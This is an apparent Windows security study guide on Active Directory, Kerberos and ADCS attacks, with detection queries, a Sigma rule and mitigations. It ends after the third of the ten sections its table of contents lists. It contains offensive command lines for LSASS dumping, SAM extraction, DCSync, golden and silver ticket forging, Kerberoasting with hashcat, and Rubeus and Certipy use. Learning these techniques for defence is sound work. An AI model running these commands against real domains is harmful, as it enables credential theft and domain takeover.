# 09 - Windows Security
## Comprehensive Guide: Active Directory, Kerberos, Events, PowerShell, LOLBins, Forensics

---

## Table of Contents
1. [Active Directory Attack Kill Chain](#active-directory-attack-kill-chain)
2. [Kerberos Attacks In-Depth](#kerberos-attacks-in-depth)
3. [ADCS Attacks (ESC1-ESC8)](#adcs-attacks-esc1-esc8)
4. [Critical Windows Events](#critical-windows-events)
5. [Sysmon Event Reference](#sysmon-event-reference)
6. [PowerShell Attack Patterns](#powershell-attack-patterns)
7. [LOLBins Complete Reference](#lolbins-complete-reference)
8. [Windows Persistence Mechanisms](#windows-persistence-mechanisms)
9. [Windows Forensic Artifacts](#windows-forensic-artifacts)
10. [Interview Questions](#interview-questions---windows-security)

---

## Active Directory Attack Kill Chain

### Phase 1: Reconnaissance

```
EXTERNAL RECONNAISSANCE:
├── DNS enumeration (dig, nslookup, fierce)
│   └── Identify domain controllers, mail servers, SRV records
├── OSINT for employee information
│   └── LinkedIn, email formats, org charts
├── Credential dumps from breaches
│   └── HaveIBeenPwned, dehashed
└── Public infrastructure scanning
    └── Shodan, Censys for exposed services

INTERNAL RECONNAISSANCE (Post-Initial Access):
┌─────────────────────────────────────────────────────────────────────────┐
│ LDAP ENUMERATION                                                        │
│ ├── Domain Controllers: (objectCategory=computer)(userAccountControl:  │
│ │                        1.2.840.113556.1.4.803:=8192)                  │
│ ├── Domain Admins: (memberOf=CN=Domain Admins,CN=Users,DC=...)         │
│ ├── Service Accounts: (servicePrincipalName=*)                         │
│ ├── Kerberoastable: (&(objectClass=user)(servicePrincipalName=*))      │
│ ├── AS-REP Roastable: (userAccountControl:1.2.840.113556.1.4.803:=     │
│ │                       4194304)                                        │
│ ├── Unconstrained Delegation: (userAccountControl:1.2.840.113556.1.4.  │
│ │                               803:=524288)                            │
│ └── LAPS: (ms-Mcs-AdmPwd=*)                                            │
├─────────────────────────────────────────────────────────────────────────┤
│ BLOODHOUND/SHARPHOUND COLLECTION                                        │
│ ├── Collects: Users, Groups, Computers, Sessions, ACLs, Trusts         │
│ ├── Identifies: Shortest paths to Domain Admin                          │
│ ├── Finds: Kerberoastable users, delegation abuse                       │
│ └── Maps: Trust relationships, GPO links                                │
├─────────────────────────────────────────────────────────────────────────┤
│ DETECTION                                                               │
│ ├── LDAP queries from non-admin workstations                            │
│ ├── High volume LDAP requests                                           │
│ ├── BloodHound/SharpHound process execution                             │
│ └── Service principal enumeration (4769 spike)                          │
└─────────────────────────────────────────────────────────────────────────┘

DETECTION QUERY - LDAP Enumeration:
index=windows EventCode=4662
| where ObjectType="*domainDNS*" OR ObjectType="*organizationalUnit*"
| stats count by SubjectUserName, Computer
| where count > 100

DETECTION QUERY - BloodHound Collection:
index=sysmon EventCode=1
| where Image IN ("*\\SharpHound*", "*\\BloodHound*")
   OR CommandLine="*Invoke-BloodHound*"
   OR CommandLine="*Get-DomainUser*"
   OR CommandLine="*Get-DomainComputer*"
| stats count by Image, CommandLine, User, Computer
```

### Phase 2: Initial Access

```
PASSWORD ATTACKS:
┌─────────────────────────────────────────────────────────────────────────┐
│ PASSWORD SPRAYING                                                       │
│ ├── Technique: Try common passwords against many accounts               │
│ ├── Evasion: Stay below lockout threshold                              │
│ ├── Tools: Spray, Ruler, MailSniper                                    │
│ └── Targets: OWA, VPN, RDP, Azure AD                                   │
├─────────────────────────────────────────────────────────────────────────┤
│ DETECTION - Password Spraying                                           │
│ index=windows EventCode=4625                                            │
│ | bucket _time span=1h                                                  │
│ | stats dc(TargetUserName) as unique_users,                            │
│         count as total_failures by IpAddress, _time                     │
│ | where unique_users > 10 AND total_failures > 20                       │
├─────────────────────────────────────────────────────────────────────────┤
│ KERBEROASTING                                                           │
│ ├── Technique: Request TGS for SPNs, crack offline                     │
│ ├── Target: Service accounts with SPNs                                  │
│ ├── Tools: Rubeus, GetUserSPNs.py                                      │
│ └── Risk: Weak service account passwords                                │
├─────────────────────────────────────────────────────────────────────────┤
│ AS-REP ROASTING                                                         │
│ ├── Technique: Request AS-REP for accounts without preauth             │
│ ├── Target: Accounts with "Do not require Kerberos preauth"            │
│ ├── Tools: Rubeus, GetNPUsers.py                                       │
│ └── Risk: Misconfigured accounts                                        │
└─────────────────────────────────────────────────────────────────────────┘
```

### Phase 3: Privilege Escalation

```
LOCAL PRIVILEGE ESCALATION:
├── Unquoted service paths
├── Weak service permissions
├── AlwaysInstallElevated
├── Token impersonation (Potato family)
├── DLL hijacking
├── Credential harvesting from memory
└── UAC bypass

DOMAIN PRIVILEGE ESCALATION:
┌─────────────────────────────────────────────────────────────────────────┐
│ ACL ABUSE                                                               │
│ ├── GenericAll: Full control over object                               │
│ │   └── Reset password, add to group, modify object                    │
│ ├── GenericWrite: Modify object attributes                              │
│ │   └── Write SPN for Kerberoasting, modify logon script               │
│ ├── WriteDACL: Modify object permissions                                │
│ │   └── Grant yourself GenericAll                                       │
│ ├── WriteOwner: Take ownership of object                                │
│ │   └── Then modify DACL                                                │
│ ├── ForceChangePassword: Reset user's password                          │
│ │   └── No current password required                                    │
│ └── AddMember: Add members to group                                     │
│     └── Add yourself to privileged group                                │
├─────────────────────────────────────────────────────────────────────────┤
│ DELEGATION ABUSE                                                        │
│ ├── Unconstrained Delegation                                            │
│ │   ├── Server stores user's TGT                                       │
│ │   ├── Attacker extracts TGT from memory                               │
│ │   └── Coerce DC to authenticate, capture TGT                         │
│ ├── Constrained Delegation                                              │
│ │   ├── S4U2Self + S4U2Proxy                                           │
│ │   └── Request ticket as any user to allowed services                 │
│ └── Resource-Based Constrained Delegation (RBCD)                        │
│     ├── Modify msDS-AllowedToActOnBehalfOfOtherIdentity                │
│     └── Impersonate users to target service                             │
├─────────────────────────────────────────────────────────────────────────┤
│ ADCS ABUSE (Certificate Services)                                       │
│ ├── ESC1-ESC8 vulnerabilities                                          │
│ ├── Request certificate as privileged user                              │
│ └── Certificate-based authentication                                    │
└─────────────────────────────────────────────────────────────────────────┘

DETECTION - Privileged Group Changes:
index=windows EventCode IN (4728, 4729, 4732, 4733, 4756, 4757)
| where TargetUserName IN ("Domain Admins", "Enterprise Admins",
                           "Administrators", "Schema Admins")
| stats count values(MemberName) by EventCode, TargetUserName, SubjectUserName
```

### Phase 4: Credential Access

```
CREDENTIAL THEFT TECHNIQUES:
┌─────────────────────────────────────────────────────────────────────────┐
│ LSASS MEMORY DUMPING                                                    │
│ ├── Mimikatz: sekurlsa::logonpasswords                                 │
│ ├── ProcDump: procdump -ma lsass.exe                                   │
│ ├── comsvcs.dll: rundll32 comsvcs.dll,MiniDump <PID>                   │
│ ├── Task Manager: Create dump file                                      │
│ └── Detection: Sysmon Event 10 to lsass.exe                            │
├─────────────────────────────────────────────────────────────────────────┤
│ SAM/SYSTEM EXTRACTION                                                   │
│ ├── reg save HKLM\SAM sam.save                                         │
│ ├── reg save HKLM\SYSTEM system.save                                   │
│ ├── Volume Shadow Copy extraction                                       │
│ └── Detection: Registry access to SAM hive                             │
├─────────────────────────────────────────────────────────────────────────┤
│ NTDS.DIT EXTRACTION (Domain Credentials)                                │
│ ├── Volume Shadow Copy: vssadmin create shadow /for=C:                 │
│ ├── ntdsutil: IFM creation                                             │
│ ├── DCSync (remote): mimikatz lsadump::dcsync                          │
│ └── Detection: 4662 with replication rights                            │
├─────────────────────────────────────────────────────────────────────────┤
│ DCSYNC ATTACK                                                           │
│ ├── Requires: DS-Replication-Get-Changes +                             │
│ │             DS-Replication-Get-Changes-All                           │
│ ├── Default holders: Domain Controllers, Domain Admins,                │
│ │                    Enterprise Admins, Administrators                  │
│ └── Extracts: Password hashes for any/all domain users                 │
└─────────────────────────────────────────────────────────────────────────┘

DETECTION - DCSync:
index=windows EventCode=4662
| where Properties="*Replicating Directory Changes*"
| where NOT match(SubjectUserName, "\\$$")  /* Exclude machine accounts */
| where NOT SubjectUserName IN ("known_dc_account")
| stats count by SubjectUserName, SubjectDomainName, Computer

DETECTION - LSASS Access:
index=sysmon EventCode=10 TargetImage="*\\lsass.exe"
| where NOT SourceImage IN ("*\\csrss.exe", "*\\wininit.exe",
                            "*\\MsMpEng.exe", "*\\services.exe")
| stats count by SourceImage, SourceUser, GrantedAccess
```

### Phase 5: Lateral Movement

```
LATERAL MOVEMENT TECHNIQUES:
┌─────────────────────────────────────────────────────────────────────────┐
│ PASS-THE-HASH (PtH)                                                     │
│ ├── Protocol: NTLM authentication                                       │
│ ├── Requirement: NTLM hash of user                                      │
│ ├── Tools: Mimikatz, pth-winexe, Impacket                              │
│ ├── Works: SMB, WMI, WinRM (sometimes)                                  │
│ └── Detection: NTLM auth from unusual sources                          │
├─────────────────────────────────────────────────────────────────────────┤
│ PASS-THE-TICKET (PtT)                                                   │
│ ├── Protocol: Kerberos authentication                                   │
│ ├── Requirement: Stolen Kerberos ticket (TGT or TGS)                   │
│ ├── Tools: Mimikatz, Rubeus                                            │
│ ├── Works: Any Kerberos-enabled service                                │
│ └── Detection: Ticket use from unusual endpoints                       │
├─────────────────────────────────────────────────────────────────────────┤
│ OVERPASS-THE-HASH                                                       │
│ ├── Technique: Use NTLM hash to request Kerberos ticket                │
│ ├── Advantage: Bypasses NTLM restrictions, looks like Kerberos         │
│ ├── Tools: Mimikatz, Rubeus                                            │
│ └── Detection: RC4 Kerberos requests (unusual encryption)              │
├─────────────────────────────────────────────────────────────────────────┤
│ REMOTE EXECUTION METHODS                                                │
│ ├── PsExec: SMB + Service creation                                     │
│ │   └── Event 7045 (Service Install), 4624 Type 3                      │
│ ├── WMI: DCOM + WMI process creation                                   │
│ │   └── wmiprvse.exe spawning processes                                │
│ ├── WinRM/PSRemoting: HTTP/HTTPS 5985/5986                             │
│ │   └── wsmprovhost.exe spawning processes                             │
│ ├── DCOM: Various DCOM objects (MMC20, ShellBrowserWindow)             │
│ │   └── mmc.exe or explorer.exe spawning processes                     │
│ ├── RDP: Terminal Services 3389                                         │
│ │   └── Event 4624 Type 10                                             │
│ └── SSH: OpenSSH Server (newer Windows)                                │
│     └── sshd.exe spawning processes                                    │
└─────────────────────────────────────────────────────────────────────────┘

DETECTION - Lateral Movement Summary:
# PsExec/Service-based
index=windows EventCode=7045
| where ServiceName IN ("PSEXESVC", "RemComSvc", "csexecsvc")
| stats count by ServiceName, ImagePath, Computer

# WMI Remote
index=sysmon EventCode=1 ParentImage="*\\WmiPrvSE.exe"
| where NOT Image IN ("*\\WmiPrvSE.exe", "*\\scrcons.exe")
| stats count by Image, CommandLine, Computer

# WinRM
index=sysmon EventCode=1 ParentImage="*\\wsmprovhost.exe"
| stats count by Image, CommandLine, Computer
```

### Phase 6: Persistence

```
DOMAIN PERSISTENCE TECHNIQUES:
┌─────────────────────────────────────────────────────────────────────────┐
│ GOLDEN TICKET                                                           │
│ ├── Requirement: KRBTGT hash (from DCSync or NTDS.dit)                 │
│ ├── Capability: Forge TGT for any user, any group membership           │
│ ├── Duration: 10 years (default TGT lifetime)                          │
│ ├── Survival: Survives password resets (except KRBTGT)                 │
│ └── Mitigation: Reset KRBTGT twice (wait replication)                  │
├─────────────────────────────────────────────────────────────────────────┤
│ SILVER TICKET                                                           │
│ ├── Requirement: Service account password hash                          │
│ ├── Capability: Forge TGS for specific service                         │
│ ├── Advantage: No DC contact needed, stealthier                        │
│ └── Limitation: Access to one service only                             │
├─────────────────────────────────────────────────────────────────────────┤
│ DIAMOND TICKET                                                          │
│ ├── Technique: Modify legitimate TGT (not forge new one)               │
│ ├── Advantage: Legitimate PAC, harder to detect                        │
│ └── Requirement: KRBTGT hash + ability to modify TGT                   │
├─────────────────────────────────────────────────────────────────────────┤
│ SKELETON KEY                                                            │
│ ├── Technique: Patch LSASS on DC                                       │
│ ├── Effect: Master password for all accounts                           │
│ ├── Survival: Until DC reboot                                          │
│ └── Detection: Unusual LSASS memory modifications                      │
├─────────────────────────────────────────────────────────────────────────┤
│ DSRM PERSISTENCE                                                        │
│ ├── Technique: Enable DSRM account network logon                       │
│ ├── Registry: DsrmAdminLogonBehavior = 2                               │
│ └── Detection: Registry modification monitoring                         │
├─────────────────────────────────────────────────────────────────────────┤
│ ADMINSDHOLDER                                                           │
│ ├── Technique: Add ACE to AdminSDHolder                                │
│ ├── Effect: ACE propagates to all protected groups                     │
│ ├── Propagation: Every 60 minutes by SDProp                            │
│ └── Detection: AdminSDHolder ACL modifications (5136)                  │
├─────────────────────────────────────────────────────────────────────────┤
│ DCSHADOW                                                                │
│ ├── Technique: Register rogue DC, push malicious changes               │
│ ├── Capability: Modify any AD object, add backdoor                     │
│ └── Detection: New DC registration, replication anomalies              │
├─────────────────────────────────────────────────────────────────────────┤
│ SID HISTORY INJECTION                                                   │
│ ├── Technique: Add privileged SID to user's SID history               │
│ ├── Effect: User inherits privileges of SID                            │
│ └── Detection: SID history attribute changes                           │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## Kerberos Attacks In-Depth

### Kerberos Authentication Flow

```
STANDARD KERBEROS AUTHENTICATION:

┌────────┐         ┌─────┐         ┌─────────┐
│ Client │         │ KDC │         │ Service │
└────┬───┘         └──┬──┘         └────┬────┘
     │                │                  │
     │ AS-REQ         │                  │
     │ (username +    │                  │
     │  timestamp)    │                  │
     │───────────────>│                  │
     │                │                  │
     │ AS-REP         │                  │
     │ (TGT encrypted │                  │
     │  with KRBTGT)  │                  │
     │<───────────────│                  │
     │                │                  │
     │ TGS-REQ        │                  │
     │ (TGT + SPN)    │                  │
     │───────────────>│                  │
     │                │                  │
     │ TGS-REP        │                  │
     │ (TGS encrypted │                  │
     │  with svc pwd) │                  │
     │<───────────────│                  │
     │                │                  │
     │ AP-REQ (TGS)   │                  │
     │───────────────────────────────────>│
     │                │                  │
     │ AP-REP         │                  │
     │<───────────────────────────────────│
     │                │                  │

KEY COMPONENTS:
├── KDC (Key Distribution Center): Usually DC, issues tickets
├── TGT (Ticket Granting Ticket): Encrypted with KRBTGT hash
├── TGS (Ticket Granting Service): Encrypted with service account hash
├── SPN (Service Principal Name): Identifies the target service
├── PAC (Privilege Attribute Certificate): Contains user group memberships
└── Pre-Authentication: Proves identity before TGT issuance
```

### Kerberoasting

```
ATTACK OVERVIEW:
┌─────────────────────────────────────────────────────────────────────────┐
│ KERBEROASTING                                                           │
│                                                                         │
│ Technique: Request TGS tickets for service accounts, crack offline     │
│                                                                         │
│ Requirements:                                                           │
│ ├── Valid domain user credentials                                       │
│ └── Service accounts with SPNs registered                               │
│                                                                         │
│ Attack Flow:                                                            │
│ 1. Enumerate SPNs: setspn -T domain -Q */*                             │
│ 2. Request TGS: mimikatz kerberos::ask /target:<SPN>                   │
│ 3. Extract ticket (RC4 encrypted with service account password hash)   │
│ 4. Crack offline: hashcat -m 13100 ticket.kirbi wordlist.txt          │
│                                                                         │
│ Tools:                                                                  │
│ ├── Rubeus: Rubeus.exe kerberoast                                      │
│ ├── Impacket: GetUserSPNs.py -request                                  │
│ ├── PowerView: Invoke-Kerberoast                                       │
│ └── Mimikatz: kerberos::ask                                            │
└─────────────────────────────────────────────────────────────────────────┘

DETECTION - Kerberoasting:
# High volume TGS requests
index=windows EventCode=4769
| stats count dc(ServiceName) as unique_services by TargetUserName, IpAddress
| where unique_services > 10

# RC4 encryption (weaker, targeted by attackers)
index=windows EventCode=4769 TicketEncryptionType="0x17"
| where ServiceName!="krbtgt"
| stats count by TargetUserName, ServiceName, IpAddress
| where count > 5

SIGMA RULE:
title: Potential Kerberoasting Activity
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4769
        TicketEncryptionType: '0x17'
        TicketOptions: '0x40810000'
    filter:
        ServiceName|endswith: '$'
    condition: selection and not filter

MITIGATIONS:
├── Use long, complex passwords for service accounts (25+ characters)
├── Use Group Managed Service Accounts (gMSAs)
├── Implement AES encryption (disable RC4)
├── Monitor for high-volume TGS requests
└── Regular service account password rotation
```

### AS-REP Roasting

```
ATTACK OVERVIEW:
┌─────────────────────────────────────────────────────────────────────────┐
│ AS-REP ROASTING                                                         │
│                                                                         │
│ Technique: Request AS-REP for accounts without preauth, crack offline  │
│                                                                         │
│ Requirements:                                                           │
│ ├── Accounts with "Do not require Kerberos preauthentication"          │
│ └── No credentials needed (just valid username)                        │
│                                                                         │
│ Attack Flow:                                                            │
│ 1. Enumerate vulnerable accounts (LDAP query)                          │
│ 2. Send AS-REQ without preauthentication                               │
│ 3. KDC returns AS-REP (encrypted with user's password hash)            │
│ 4. Crack offline: hashcat -m 18200 asrep.txt wordlist.txt             │
│                                                                         │
│ Tools:                                                                  │
│ ├── Rubeus: Rubeus.exe asreproast                                      │
│ ├── Impacket: GetNPUsers.py -no-pass                                   │
│ └── PowerView: Get-DomainUser -PreauthNotRequired                      │
└─────────────────────────────────────────────────────────────────────────┘

DETECTION - AS-REP Roasting:
index=windows EventCode=4768 PreAuthType="0"
| stats count by TargetUserName, IpAddress
| where count > 1

LDAP QUERY TO FIND VULNERABLE ACCOUNTS:
(userAccountControl:1.2.840.113556.1.4.803:=4194304)

MITIGATIONS:
├── Remove "Do not require Kerberos preauthentication" flag
├── Audit accounts with this flag regularly
├── Use strong passwords for any required accounts
└── Monitor for AS-REQ without preauthentication
```

### Golden Ticket Attack

```
ATTACK OVERVIEW:
┌─────────────────────────────────────────────────────────────────────────┐
│ GOLDEN TICKET                                                           │
│                                                                         │
│ Technique: Forge TGT using KRBTGT hash for any user/group membership   │
│                                                                         │
│ Requirements:                                                           │
│ ├── KRBTGT account NTLM hash                                           │
│ ├── Domain SID                                                          │
│ └── Domain name                                                         │
│                                                                         │
│ Capabilities:                                                           │
│ ├── Impersonate any user (including non-existent users)                │
│ ├── Add any group membership to PAC                                    │
│ ├── Valid for 10 years (default)                                       │
│ └── Survives user password changes                                     │
│                                                                         │
│ Creation:                                                               │
│ mimikatz # kerberos::golden /user:Administrator /domain:corp.local \   │
│           /sid:S-1-5-21-... /krbtgt:<NTLM_HASH> /ticket:golden.kirbi   │
│                                                                         │
│ Usage:                                                                  │
│ mimikatz # kerberos::ptt golden.kirbi                                  │
│ Then access any resource in the domain                                  │
└─────────────────────────────────────────────────────────────────────────┘

DETECTION - Golden Ticket:
# TGT without corresponding AS-REQ (ticket appeared from nowhere)
# Compare 4768 (TGT request) with 4769 (TGS request) timing

# Look for anomalies in ticket lifetime
index=windows EventCode=4769
| where TicketOptions="0x40810010"  # Forwardable, Renewable, Enc-PA-Rep
| stats count by TargetUserName, ServiceName

# Domain SID mismatches in events
# User exists but SID doesn't match current directory

INDICATORS:
├── Ticket lifetime > 10 hours
├── User doesn't exist in AD
├── SID doesn't match directory
├── PAC contains unusual group memberships
├── Ticket encryption type mismatch
└── TGS request without prior TGT request (from that host)

MITIGATIONS:
├── Reset KRBTGT password twice (wait for replication between resets)
├── Monitor for KRBTGT hash extraction (DCSync)
├── Implement Credential Guard
├── Use Protected Users security group
└── Monitor for anomalous Kerberos activity
```

### Silver Ticket Attack

```
ATTACK OVERVIEW:
┌─────────────────────────────────────────────────────────────────────────┐
│ SILVER TICKET                                                           │
│                                                                         │
│ Technique: Forge TGS for specific service using service account hash   │
│                                                                         │
│ Requirements:                                                           │
│ ├── Service account NTLM hash                                          │
│ ├── Domain SID                                                          │
│ ├── Target SPN                                                          │
│ └── Domain name                                                         │
│                                                                         │
│ Capabilities:                                                           │
│ ├── Access to specific service only                                    │
│ ├── No DC contact required (stealthier)                                │
│ ├── PAC validation often skipped                                       │
│ └── Survives service account password change (until ticket expires)    │
│                                                                         │
│ Common Targets:                                                         │
│ ├── CIFS (file share access)                                           │
│ ├── HTTP (web services)                                                │
│ ├── HOST (PsExec, WMI)                                                 │
│ ├── LDAP (AD queries)                                                  │
│ ├── MSSQLSvc (database access)                                         │
│ └── WSMAN (WinRM)                                                      │
│                                                                         │
│ Creation:                                                               │
│ mimikatz # kerberos::golden /user:Administrator /domain:corp.local \   │
│           /sid:S-1-5-21-... /target:server.corp.local \                │
│           /rc4:<SVC_HASH> /service:CIFS /ticket:silver.kirbi           │
└─────────────────────────────────────────────────────────────────────────┘

DETECTION - Silver Ticket:
# Service ticket without TGS request (appeared from nowhere)
# No 4769 event preceding service access

# Analyze service access patterns
index=windows EventCode IN (4624, 5140)
| where LogonType=3
| stats count by TargetUserName, Computer, IpAddress
| lookup recent_tgs_requests TargetUserName OUTPUT tgs_time
| where isnull(tgs_time)  # No TGS request for this access

DIFFERENCES FROM GOLDEN TICKET:
├── Scope: Single service vs. entire domain
├── DC Contact: Not required vs. required for TGS
├── Detection: Harder (no 4769) vs. easier
├── Persistence: Until ticket expires vs. 10 years
└── Requirements: Service hash vs. KRBTGT hash
```

### Diamond Ticket Attack

```
ATTACK OVERVIEW:
┌─────────────────────────────────────────────────────────────────────────┐
│ DIAMOND TICKET                                                          │
│                                                                         │
│ Technique: Modify legitimate TGT rather than forge completely new one  │
│                                                                         │
│ Advantage over Golden Ticket:                                           │
│ ├── TGT was legitimately issued (passes some detections)              │
│ ├── PAC is properly signed initially                                   │
│ └── Ticket metadata appears more legitimate                            │
│                                                                         │
│ Process:                                                                │
│ 1. Request legitimate TGT for a user                                   │
│ 2. Decrypt with KRBTGT hash                                            │
│ 3. Modify PAC (add privileged groups)                                  │
│ 4. Re-encrypt with KRBTGT hash                                         │
│ 5. Use modified ticket                                                 │
│                                                                         │
│ Tools:                                                                  │
│ └── Rubeus: Rubeus.exe diamond /krbkey:<AES256_KRBTGT>                 │
│             /ticketuser:<USER> /ticketuserid:<RID> /groups:<RIDs>      │
└─────────────────────────────────────────────────────────────────────────┘

DETECTION:
├── PAC contains groups user shouldn't have
├── Compare PAC groups with actual AD group membership
├── Behavioral analysis of user accessing unusual resources
└── Monitor for KRBTGT hash extraction
```

### Delegation Attacks

```
UNCONSTRAINED DELEGATION:
┌─────────────────────────────────────────────────────────────────────────┐
│ How It Works:                                                           │
│ ├── Server is trusted for delegation                                   │
│ ├── When user authenticates, TGT is cached on server                  │
│ ├── Server can impersonate user to ANY service                        │
│                                                                         │
│ Attack:                                                                 │
│ 1. Compromise server with unconstrained delegation                     │
│ 2. Coerce high-privilege user/DC to authenticate (SpoolSample, etc.)  │
│ 3. Extract their TGT from memory                                       │
│ 4. Pass-the-Ticket to impersonate victim                               │
│                                                                         │
│ Find Unconstrained Delegation:                                          │
│ (userAccountControl:1.2.840.113556.1.4.803:=524288)                    │
│                                                                         │
│ Coercion Techniques:                                                    │
│ ├── PrinterBug/SpoolSample: MS-RPRN abuse                              │
│ ├── PetitPotam: MS-EFSRPC abuse                                        │
│ ├── DFSCoerce: MS-DFSNM abuse                                          │
│ └── ShadowCoerce: MS-FSRVP abuse                                       │
└─────────────────────────────────────────────────────────────────────────┘

CONSTRAINED DELEGATION:
┌─────────────────────────────────────────────────────────────────────────┐
│ How It Works:                                                           │
│ ├── Server can only delegate to specific services (SPN list)          │
│ ├── Uses S4U2Self (get ticket to self for user)                       │
│ ├── Uses S4U2Proxy (get ticket to allowed service)                    │
│                                                                         │
│ Attack:                                                                 │
│ 1. Compromise account with constrained delegation                      │
│ 2. S4U2Self to get ticket for target user                             │
│ 3. S4U2Proxy to get ticket to allowed service                         │
│ 4. If "any auth" - can modify target service name                     │
│                                                                         │
│ Find Constrained Delegation:                                            │
│ (msds-allowedtodelegateto=*)                                           │
└─────────────────────────────────────────────────────────────────────────┘

RESOURCE-BASED CONSTRAINED DELEGATION (RBCD):
┌─────────────────────────────────────────────────────────────────────────┐
│ How It Works:                                                           │
│ ├── Target computer specifies who can delegate TO it                   │
│ ├── Stored in msDS-AllowedToActOnBehalfOfOtherIdentity                │
│ ├── Can be modified by anyone with write access to computer           │
│                                                                         │
│ Attack:                                                                 │
│ 1. Find computer object you have write access to                       │
│ 2. Configure RBCD to allow your controlled account                     │
│ 3. S4U2Self + S4U2Proxy to impersonate admin to target                │
│                                                                         │
│ Abuse Requirements:                                                     │
│ ├── Write access to target computer's AD object                       │
│ ├── Control of account with SPN (or add SPN to computer account)      │
│                                                                         │
│ Tools:                                                                  │
│ ├── Rubeus: S4U to get ticket                                         │
│ ├── PowerView: Set-DomainObject to configure RBCD                     │
│ └── Impacket: getST.py -impersonate                                   │
└─────────────────────────────────────────────────────────────────────────┘

DETECTION - Delegation Abuse:
# Monitor for delegation configuration changes
index=windows EventCode=5136
| where AttributeLDAPDisplayName="msDS-AllowedToActOnBehalfOfOtherIdentity"
| stats count by ObjectDN, SubjectUserName

# Monitor for S4U ticket requests
index=windows EventCode=4769
| where TransmittedServices!=""  # Indicates S4U2Proxy
| stats count by TargetUserName, ServiceName, TransmittedServices
```

---

## ADCS Attacks (ESC1-ESC8)

```
ADCS OVERVIEW:
Active Directory Certificate Services provides PKI functionality.
Misconfigurations can allow privilege escalation and persistence.

┌─────────────────────────────────────────────────────────────────────────┐
│ ESC1: Misconfigured Certificate Templates - SAN                        │
├─────────────────────────────────────────────────────────────────────────┤
│ Vulnerability:                                                          │
│ ├── Template allows requestor to specify SAN (Subject Alternative Name)│
│ ├── CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag enabled                     │
│ ├── Low-privileged users can enroll                                    │
│ ├── Template enables client authentication                              │
│                                                                         │
│ Attack:                                                                 │
│ 1. Request certificate with arbitrary SAN (e.g., Administrator UPN)    │
│ 2. Use certificate to authenticate as that user                        │
│                                                                         │
│ Detection:                                                              │
│ ├── Event 4886: Certificate requested with SAN                         │
│ ├── Event 4887: Certificate issued                                     │
│ └── Compare requestor with SAN identity                                │
│                                                                         │
│ Remediation:                                                            │
│ └── Remove CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT or require approval       │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ ESC2: Misconfigured Certificate Templates - Any Purpose                │
├─────────────────────────────────────────────────────────────────────────┤
│ Vulnerability:                                                          │
│ ├── Template allows "Any Purpose" or no EKU specified                  │
│ ├── Can be used for client auth, code signing, etc.                    │
│                                                                         │
│ Attack:                                                                 │
│ └── Request certificate, use for authentication                        │
│                                                                         │
│ Remediation:                                                            │
│ └── Specify explicit EKUs in templates                                 │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ ESC3: Enrollment Agent Templates                                        │
├─────────────────────────────────────────────────────────────────────────┤
│ Vulnerability:                                                          │
│ ├── Template has Certificate Request Agent EKU                        │
│ ├── Low-privileged users can enroll                                    │
│ ├── Another template allows enrollment on behalf of others             │
│                                                                         │
│ Attack:                                                                 │
│ 1. Get enrollment agent certificate                                    │
│ 2. Use it to request certificate for privileged user                   │
│                                                                         │
│ Remediation:                                                            │
│ └── Restrict enrollment agent permissions                              │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ ESC4: Vulnerable Certificate Template Access Control                   │
├─────────────────────────────────────────────────────────────────────────┤
│ Vulnerability:                                                          │
│ ├── Low-privileged users have write access to template                 │
│ ├── Can modify template to enable ESC1-style attack                    │
│                                                                         │
│ Attack:                                                                 │
│ 1. Modify template to allow SAN specification                          │
│ 2. Exploit as ESC1                                                     │
│                                                                         │
│ Remediation:                                                            │
│ └── Review and restrict template ACLs                                  │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ ESC5: Vulnerable PKI Object Access Control                             │
├─────────────────────────────────────────────────────────────────────────┤
│ Vulnerability:                                                          │
│ ├── Write access to CA server AD object                                │
│ ├── Write access to CA's certificate                                   │
│ ├── Can modify CA's template list                                      │
│                                                                         │
│ Attack:                                                                 │
│ └── Modify CA configuration to enable vulnerable templates             │
│                                                                         │
│ Remediation:                                                            │
│ └── Review ACLs on all PKI AD objects                                  │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2                                   │
├─────────────────────────────────────────────────────────────────────────┤
│ Vulnerability:                                                          │
│ ├── CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled                 │
│ ├── Allows SAN to be specified in any request                          │
│                                                                         │
│ Attack:                                                                 │
│ └── Request any certificate with arbitrary SAN                         │
│                                                                         │
│ Check: certutil -getreg policy\EditFlags                               │
│ Remediation: Disable EDITF_ATTRIBUTESUBJECTALTNAME2                    │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ ESC7: Vulnerable Certificate Authority Access Control                  │
├─────────────────────────────────────────────────────────────────────────┤
│ Vulnerability:                                                          │
│ ├── User has ManageCA right on CA                                      │
│ ├── Can enable ESC6 flag or approve pending requests                   │
│                                                                         │
│ Attack:                                                                 │
│ 1. Enable EDITF_ATTRIBUTESUBJECTALTNAME2                               │
│ 2. Exploit as ESC6, or approve pending malicious requests              │
│                                                                         │
│ Remediation:                                                            │
│ └── Review ManageCA permissions                                        │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ ESC8: NTLM Relay to AD CS HTTP Endpoints                               │
├─────────────────────────────────────────────────────────────────────────┤
│ Vulnerability:                                                          │
│ ├── Web enrollment enabled on CA                                       │
│ ├── NTLM authentication allowed                                        │
│ ├── No Extended Protection for Authentication (EPA)                    │
│                                                                         │
│ Attack:                                                                 │
│ 1. Coerce victim to authenticate (PetitPotam, etc.)                   │
│ 2. Relay NTLM auth to CA web enrollment                               │
│ 3. Request certificate as victim                                       │
│                                                                         │
│ Remediation:                                                            │
│ ├── Disable NTLM on CA                                                 │
│ ├── Enable EPA                                                         │
│ └── Disable web enrollment if not needed                               │
└─────────────────────────────────────────────────────────────────────────┘

ADCS ENUMERATION:
# Certify
Certify.exe find /vulnerable

# Certipy
certipy find -u user@domain -p password -dc-ip 10.10.10.1

ADCS DETECTION:
# Certificate requests with SAN
index=windows EventCode=4886
| where SANs!=""
